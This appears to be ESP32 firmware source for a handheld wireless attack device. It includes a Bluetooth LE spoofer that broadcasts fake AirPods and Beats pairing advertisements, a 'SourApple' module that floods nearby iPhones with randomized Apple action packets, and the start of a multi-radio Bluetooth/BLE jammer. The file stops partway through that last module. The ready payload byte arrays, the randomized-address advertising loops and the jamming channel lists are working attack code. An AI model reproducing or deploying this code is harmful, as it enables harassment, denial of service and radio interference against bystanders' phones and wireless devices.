#include "bleconfig.h"
#include "shared.h"
#include "icon.h"
#include "Touchscreen.h"
#include <RCSwitch.h>
#include <ELECHOUSE_CC1101_ESP32DIV.h>

// External reference to SubGHz RCSwitch object (defined in subghz.cpp replayat namespace)
namespace replayat {
    extern RCSwitch mySwitch;
    extern bool subghz_receive_active;  // Flag to check if RCSwitch receive is enabled
}

/*
   BleSpoofer

*/

namespace BleSpoofer {

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_SELECT 7

#define SCREEN_HEIGHT 250
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String spooferBuffer[MAX_LINES];
uint16_t colorspooferBuffer[MAX_LINES];
int spooferlineIndex = 0;

static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;

BLEAdvertising *pAdvertising;
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint32_t delayMillisecond = 1000;
unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;

unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500;

bool isAdvertising = false;

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;

// Payload data
const uint8_t DEVICES[][31] = {
  // Airpods
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Max
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Flex
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats X
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Betas Fit Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds Plus
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) {
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  }

  int adv_type_choice = random(3);

  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  return oAdvertisementData;
}

void Printspoofer(String text, uint16_t color, bool extraSpace = false) {
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
  if (spooferlineIndex >= MAX_LINES - 1) {
    for (int i = 0; i < MAX_LINES - 1; i++) {
      spooferBuffer[i] = spooferBuffer[i + 1];
      colorspooferBuffer[i] = colorspooferBuffer[i + 1];
    }
    spooferlineIndex = MAX_LINES - 1;
  }

  spooferBuffer[spooferlineIndex] = text;
  colorspooferBuffer[spooferlineIndex] = color;
  spooferlineIndex++;

  if (extraSpace && spooferlineIndex < MAX_LINES) {
    spooferBuffer[spooferlineIndex] = "";
    colorspooferBuffer[spooferlineIndex] = SHREDDY_TEAL;
    spooferlineIndex++;
  }

  for (int i = 0; i < spooferlineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(colorspooferBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(spooferBuffer[i]);
  }
}

void sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;

  String bar = "[";
  for (int i = 0; i < 20; i++) {
    bar += (i < filledBlocks) ? "#" : "_";
  }
  bar += "]";

  Printspoofer(bar, TFT_GREEN);
}

void updateSpoofer() {
  tft.drawLine(0, 292, 240, 292, ORANGE);
  tft.fillRect(0, 293, 240, 50, DARK_GRAY);
  tft.fillRect(50, 295, 150, 16, DARK_GRAY);
  tft.fillRect(60, 310, 150, 16, DARK_GRAY);

  tft.setCursor(5, 295);
  tft.setTextColor(SHREDDY_TEAL, DARK_GRAY);
  tft.print("Device:");
  int x = 50;
  int y = 295;

  switch (deviceType) {
    case 1: tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
    case 2: tft.setCursor(x, y); tft.print("[ Airpods Pro ]"); break;
    case 3: tft.setCursor(x, y); tft.print("[ Airpods Max ]"); break;
    case 4: tft.setCursor(x, y); tft.print("[ Airpods Gen 2 ]"); break;
    case 5: tft.setCursor(x, y); tft.print("[ Airpods Gen 3 ]"); break;
    case 6: tft.setCursor(x, y); tft.print("[ Airpods Gen 2 ]"); break;
    case 7: tft.setCursor(x, y); tft.print("[ PowerBeats ]"); break;
    case 8: tft.setCursor(x, y); tft.print("[ PowerBeats Pro ]"); break;
    case 9: tft.setCursor(x, y); tft.print("[ Beats Solo Pro ]"); break;
    case 10: tft.setCursor(x, y); tft.print("[ Beats Buds ]"); break;
    case 11: tft.setCursor(x, y); tft.print("[ Beats Flex ]"); break;
    case 12: tft.setCursor(x, y); tft.print("[ BeatsX ]"); break;
    case 13: tft.setCursor(x, y); tft.print("[ Beats Solo3 ]"); break;
    case 14: tft.setCursor(x, y); tft.print("[ Beats Studio3 ]"); break;
    case 15: tft.setCursor(x, y); tft.print("[ Beats StudioPro ]"); break;
    case 16: tft.setCursor(x, y); tft.print("[ Beats FitPro ]"); break;
    case 17: tft.setCursor(x, y); tft.print("[ Beats BudsPlus ]"); break;
    default: tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
  }

  tft.setCursor(5, 310);
  tft.setTextColor(SHREDDY_TEAL, DARK_GRAY);
  tft.print("Adv Type:");

  switch (advType) {
    case 1: tft.setCursor(60, 310); tft.print("IND"); break;
    case 2: tft.setCursor(60, 310); tft.print("DIRECT HIGH"); break;
    case 3: tft.setCursor(60, 310); tft.print("SCAN"); break;
    case 4: tft.setCursor(60, 310); tft.print("NONCONN"); break;
    case 5: tft.setCursor(60, 310); tft.print("DIRECT LOW"); break;
  }

  //tft.setCursor(5, 275);
  //tft.print("Advertising:");

  //tft.setCursor(80, 275);
  //tft.print(isAdvertising ? "Active" : "Disable");

}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;
}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

void setAdvertisingData() {

  switch (deviceType) {
    case 1:
      Airpods();
      break;
    case 2:
      Airpods_pro();
      break;
    case 3:
      Airpods_Max();
      break;
    case 4:
      Airpods_Gen_2();
      break;
    case 5:
      Airpods_Gen_3();
      break;
    case 6:
      Airpods_Pro_Gen_2();
      break;
    case 7:
      Power_Beats();
      break;
    case 8:
      Power_Beats_Pro();
      break;
    case 9:
      Beats_Solo_Pro();
      break;
    case 10:
      Beats_Studio_Buds();
      break;
    case 11:
      Beats_Flex();
      break;
    case 12:
      Beats_X();
      break;
    case 13:
      Beats_Solo_3();
      break;
    case 14:
      Beats_Studio_3();
      break;
    case 15:
      Beats_Studio_Pro();
      break;
    case 16:
      Betas_Fit_Pro();
      break;
    case 17:
      Beats_Studio_Buds_Plus();
      break;
    default:
      Airpods();
      break;

      updateSpoofer();
  }
}

void handleButtonPress(int pin, void (*callback)()) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};

  int index = pin % 8;
  uint8_t currentState = pcf.digitalRead(pin);

  if (currentState == LOW && lastState[index] == HIGH) {
    unsigned long currentTime = millis();

    if ((currentTime - lastPressTime[index]) > debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > 17) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = 17;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void toggleAdvertising() {
  isAdvertising = !isAdvertising;

  if (!isAdvertising) {
    pAdvertising->stop();
    Serial.println("Advertising stopped.");
    Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
    updateSpoofer();
  } else {
    if (attack_state == 1) {
      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) {
          dummy_addr[i] |= 0xF0;
        }
      }

      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();
      delay(delayMillisecond);
      //pAdvertising->stop();

      Printspoofer("[+] Device Type: " + String(deviceType), SHREDDY_TEAL, false);
      Printspoofer("[+] Advertising Type: " + String(advType), SHREDDY_TEAL, false);
      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
    }

    Serial.println("Advertising started.");
    updateSpoofer();
  }
}

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_key,
    bitmap_icon_power,
    bitmap_icon_go_back // Added back icon
  };

  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);

  if (!uiDrawn) {

    tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
    tft.fillRect(80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      animationState = 2;

      switch (activeIcon) {
        case 0: changeDeviceTypePrev(); break;
        case 1: changeDeviceTypeNext(); break;
        case 2: changeAdvTypeNext(); break;
        case 3: toggleAdvertising(); break;
        case 4: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void spooferSetup() {

  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);

  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextColor(SHREDDY_TEAL);
  tft.setTextSize(1);
  tft.setCursor(5, 24);
  //tft.print("BLE Spoofer");

  updateSpoofer();
  runUI();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  Printspoofer("[!!] System Diagnostics", TFT_RED, true);

  for (int i = 0; i <= 4; i++) {
    sppferLoadingBar(i);
    delay(random(500));
  }

  Printspoofer("[+] System Ready!", TFT_GREEN, true);

  BLEDevice::init("AirPods 69");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
  //delay(500);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  uiDrawn = false;
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
}

void spooferLoop() {
  runUI();
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
  //updateStatusBar();

  handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
  handleButtonPress(BTN_LEFT, changeDeviceTypePrev);
  //handleButtonPress(BTN_LEFT, changeAdvTypePrev);
  handleButtonPress(BTN_DOWN, changeAdvTypeNext);
  handleButtonPress(BTN_UP, toggleAdvertising);

  delay(50);
  }
}



/*
   SourApple


*/

namespace SourApple {

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;

uint8_t packet[17];

#define MAX_LINES 30
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;
const int lineHeight = 14;


void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back // Added back icon
  };

  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);

  if (!uiDrawn) {

    tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, SHREDDY_TEAL);
      animationState = 2;

      switch (activeIcon) {
        case 0: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void updatedisplay() {
  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  runUI();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);

  for (int offset = 0; offset <= lineHeight; offset += 2) {
    tft.fillRect(0, (MAX_LINES - 1) * lineHeight - offset + 51, 240, lineHeight, TFT_BLACK);

    for (int i = 0; i < MAX_LINES; i++) {
      int y = -lineHeight + (i * lineHeight) + offset;
      if (y >= -lineHeight && y < 320) {
        tft.fillRect(0, y + 51, 240, lineHeight, TFT_BLACK);
        tft.setCursor(5, y + 55);
        tft.print(lines[i]);
      }
    }
    delay(5);
  }
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = MAX_LINES - 1; i > 0; i--) {
    lines[i] = lines[i - 1];
  }
  lines[0] = newLine;
  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + " -> ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;                             // Packet Length
  packet[i++] = 0xFF;                               // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;                               // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;                               // ...
  packet[i++] = 0x0F;                               // Type
  packet[i++] = 0x05;                               // Length
  packet[i++] = 0xC1;                               // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];      // Action Type
  esp_fill_random(&packet[i], 3);                   // Authentication Tag
  i += 3;
  packet[i++] = 0x00;                               // ???
  packet[i++] = 0x00;                               // ???
  packet[i++] =  0x10;                              // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {

  tft.setRotation(0);
  tft.setTextSize(1);
  tft.fillScreen(TFT_BLACK);

  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
  uiDrawn = false;

  setupTouchscreen();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);


}

void sourappleLoop() {
  tft.drawLine(0, 19, 240, 19, SHREDDY_TEAL);
  runUI();

  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }
  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

  Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  Advertising->addServiceUUID(device_uuid);
  Advertising->setAdvertisementData(oAdvertisementData);

  Advertising->setMinInterval(0x20);
  Advertising->setMaxInterval(0x20);
  Advertising->setMinPreferred(0x20);
  Advertising->setMaxPreferred(0x20);

  Advertising->start();

  delay(40);
  displayAdvertisementData();
}
}


/*
   BleJammer


*/

namespace BleJammer {

#define CE_PIN_1  16
#define CSN_PIN_1 17
#define CE_PIN_2  26
#define CSN_PIN_2 27
#define CE_PIN_3  4
#define CSN_PIN_3 5

#define BTN_UP       6
#define BTN_DOWN     3
#define BTN_LEFT     4
#define BTN_RIGHT    5
#define BTN_SELECT   7

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE };
OperationMode currentMode = BLE_MODULE;

bool jammerActive = false;

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 300
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;

unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 500;

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
